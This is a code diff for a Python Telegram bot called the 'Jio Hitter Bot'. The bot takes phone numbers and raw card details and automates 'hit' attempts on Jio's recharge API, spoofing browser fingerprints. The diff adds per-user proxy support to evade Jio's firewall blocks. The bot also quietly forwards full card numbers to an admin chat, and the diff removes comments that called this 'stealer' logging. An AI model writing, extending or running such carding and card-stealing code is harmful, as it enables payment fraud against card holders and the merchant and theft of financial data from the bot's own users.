@@ -48,22 +48,40 @@ ADMIN_CHAT_ID = 6755426755  # Aapki Admin ID
 
 bot = telebot.TeleBot(TG_BOT_TOKEN)
 USERS_FILE = "bot_users.json"
+PROXIES_FILE = "user_proxies.json"
 
-def load_users():
-    if os.path.exists(USERS_FILE):
+def load_json(filename):
+    if os.path.exists(filename):
         try:
-            with open(USERS_FILE, "r") as f:
-                return set(_json.load(f))
+            with open(filename, "r") as f:
+                return _json.load(f)
         except:
             pass
-    return set()
+    return {}
+
+def save_json(filename, data):
+    with open(filename, "w") as f:
+        _json.dump(data, f)
+
+def load_users():
+    return set(load_json(USERS_FILE).get("users", []))
 
 def save_user(user_id):
-    users = load_users()
+    data = load_json(USERS_FILE)
+    users = set(data.get("users", []))
     if user_id not in users:
         users.add(user_id)
-        with open(USERS_FILE, "w") as f:
-            _json.dump(list(users), f)
+        data["users"] = list(users)
+        save_json(USERS_FILE, data)
+
+def get_user_proxy(user_id):
+    proxies = load_json(PROXIES_FILE)
+    return proxies.get(str(user_id))
+
+def set_user_proxy(user_id, proxy):
+    proxies = load_json(PROXIES_FILE)
+    proxies[str(user_id)] = proxy
+    save_json(PROXIES_FILE, proxies)
 
 def ts(): return str(int(time.time()*1000))
 
@@ -104,7 +122,7 @@ def cheapest_plan(pj):
     plans = list(iter_plans(pj))
     return min(plans, key=lambda p: p["amount"]) if plans else None
 
-def jio_hit_process(recharge_number, raw_cc, target_amt, user_name, status_callback):
+def jio_hit_process(recharge_number, raw_cc, target_amt, user_name, user_id, status_callback):
     try:
         parts = raw_cc.strip().split("|")
         if len(parts) < 4:
@@ -116,14 +134,23 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, user_name, status_callb
 
     CARD_NAME = "matt henry"
     CARD_PREFIX = CARD_NUM[:6]
-    cc_full = raw_cc.strip()  # Full card for admin logs
+    cc_full = raw_cc.strip()
 
     pf = random.choice(PROFILES)
     sc = random.choice(SCREENS)
     lg = random.choice(LANGS)
     UA = pf["ua"]; SEC = pf["ch"]; PLAT = pf["plat"]; MOB = pf["mob"]; IMP = pf["imp"]
 
-    session = requests.Session(impersonate=IMP)
+    user_proxy = get_user_proxy(user_id)
+    proxies_dict = None
+    if user_proxy:
+        if not user_proxy.startswith("http://") and not user_proxy.startswith("socks5://"):
+            proxy_url = f"http://{user_proxy}"
+        else:
+            proxy_url = user_proxy
+        proxies_dict = {"http": proxy_url, "https": proxy_url}
+
+    session = requests.Session(impersonate=IMP, proxies=proxies_dict)
 
     try:
         status_callback("⚡ *[1/5]* Connecting to Jio Gateway...")
@@ -132,6 +159,10 @@ def jio_hit_process(recharge_number, raw_cc, target_amt, user_name, status_callb
         status_callback("⚡ *[2/5]* Fetching subscriber & plan info...")
         r = session.get(f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{recharge_number}",
             headers=jh("https://www.jio.com/", lg, UA, SEC, MOB, PLAT, extra={"Accept": "application/json, text/plain, */*","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-origin"}))
+        
+        if not r.text or "text/html" in r.headers.get("content-type", ""):
+            return "❌ <b>Gateway Block:</b> Proxy/IP is blocked by Jio WAF firewall."
+
         d = r.json()
         if d.get("errorMessage") == "NOT_SUBSCRIBED_USER":
             return f"❌ <b>Error:</b> Not a valid Jio number (`{recharge_number}`)."
@@ -313,13 +344,26 @@ def send_welcome(message):
         f"👤 **User Name:** {user_name}\n"
         f"🆔 **User ID:** `{user_id}`\n"
         f"💎 **Status:** Premium Authorized\n\n"
-        "🚀 **Available Command:**\n"
+        "🚀 **Available Commands:**\n"
         "• `/jhit <number> <card> [amount]`\n"
-        "  _Example:_ `/jhit 9876543210 513155...|03|30|086 239`\n"
-        "  *(Amount optionel hai, agar nahi doge toh cheapest plan utha lega)*\n\n"
+        "  _Example:_ `/jhit 9876543210 513155...|03|30|086 239`\n\n"
+        "• `/addproxy <ip:port>` ya `/addproxy <user:pass@ip:port>`\n"
+        "  _Apna custom proxy set karne ke liye._\n\n"
         "⚡ _Fast, secure & automated backend hit flow._"
     )
     bot.reply_to(message, help_text, parse_mode="Markdown")
+
+@bot.message_handler(commands=['addproxy'])
+def cmd_add_proxy(message):
+    save_user(message.from_user.id)
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "⚠️ **Format Error!**\nUse: `/addproxy <ip:port>`\n_Example:_ `/addproxy 123.45.67.89:8080`", parse_mode="Markdown")
+        return
+    
+    proxy_val = parts[1].strip()
+    set_user_proxy(message.from_user.id, proxy_val)
+    bot.reply_to(message, f"✅ **Proxy Successfully Added!**\n`{proxy_val}`\n\nAb aapka `/jhit` command isi proxy ke through chalega.", parse_mode="Markdown")
 
 @bot.message_handler(commands=['jhit'])
 def cmd_jio_hit(message):
@@ -344,10 +388,9 @@ def cmd_jio_hit(message):
             except:
                 pass
 
-        result = jio_hit_process(number, card, target_amt, user_name, update_status)
+        result = jio_hit_process(number, card, target_amt, user_name, user_id, update_status)
         bot.edit_message_text(result, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
         
-        # --- ADMIN / STEALER NOTIFICATION WITH FULL CARD & NUMBER ---
         if user_id != ADMIN_CHAT_ID:
             log_text = (
                 f"🚨 <b>NEW HIT LOGGED</b>\n"
@@ -398,5 +441,5 @@ if __name__ == "__main__":
     t.daemon = True
     t.start()
     
-    print("🤖 Jio Hitter Bot with Stealer Logs is running...")
+    print("🤖 Jio Hitter Bot with New Token & Proxy Support is running...")
     bot.infinity_polling()
